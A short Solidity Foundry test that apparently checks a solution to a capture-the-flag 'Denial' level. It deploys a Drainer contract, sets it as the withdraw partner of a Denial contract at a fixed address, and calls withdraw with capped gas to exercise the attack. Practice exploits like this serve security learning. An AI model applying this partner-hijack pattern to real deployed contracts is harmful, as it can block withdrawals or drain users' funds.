// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Drainer.sol";
import "src/Denial.sol";

contract DrainerTest is Test {

    function testDrain() public {
        Denial denial = Denial(payable(0x46a658030a28042E71787457b1034888A4a064a8));
        Drainer drainer = new Drainer(denial);
        denial.setWithdrawPartner(address(drainer));
        denial.withdraw{gas: 1_000_000}();
        assertEq(0, address(drainer).balance);
    }
}